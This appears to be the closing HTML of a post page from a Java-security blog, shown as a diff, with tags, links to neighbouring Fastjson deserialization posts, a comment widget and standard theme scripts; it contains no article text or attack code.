+    <div class="post-footer__meta"><p>文章更新于 2023-08-26</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/Fastjson/" class="post-tags__link button"># Fastjson</a><a href="/tags/alibaba/" class="post-tags__link button"># alibaba</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            Fastjson后续版本绕过分析
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/87a7e946a4d2.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            Fastjson反序列化分析
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
